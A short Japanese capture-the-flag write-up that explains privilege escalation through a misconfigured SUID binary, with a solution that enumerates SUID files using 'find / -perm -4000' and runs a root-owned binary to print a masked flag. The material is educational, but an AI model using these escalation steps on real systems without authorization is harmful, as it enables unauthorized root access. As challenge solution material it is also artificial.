# File permission S

## 解説
### 今回の問題はSUIDの設定不備による特権昇格。

### 対象ファイル
```bash
-rwsr-xr-x 1 root  root  8872 Feb 12 02:30 flag
```
- 所有者: root
- SUIDビット有効
- 誰でも実行可能

SUIDが有効なため、実行者ではなく所有者（root）の権限で実行される。

### 通常との比較
通常:  
`katoが実行 -> katoの権限 -> /root/flag.txtは読めない`

SUIDが有効:  
`katoが実行 -> ファイル所有者(今回はroot)の権限で実行 -> /root/flag.txtが読める`

### 実際の用途
SUIDは本来、限定的な特権操作のために使われる。

例:  
1. 一般ユーザーがパスワードを変更したい
2. /etc/shadowはroot権限でしか変更できない
3. /usr/bin/passwdにはSUIDが設定されている
4. root権限で安全に/etc/shadowを更新
5. パスワード変更完了

> SUIDは利便性を高めるために実際のシステムでも利用されているが、不要な設定など行うと今回のような特権昇格につながる可能性がある。

## 解法
```bash
kato@katoctf:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/chsh
/usr/bin/sudo
/home/kmjak/flag

kato@katoctf:~$ cd /home/kmjak/

kato@katoctf:/home/kmjak$ ls -la flag
-rwsr-xr-x 1 root  root  8872 Feb 12 02:30 flag

kato@katoctf:/home/kmjak$ ./flag
katoCTF{***}
```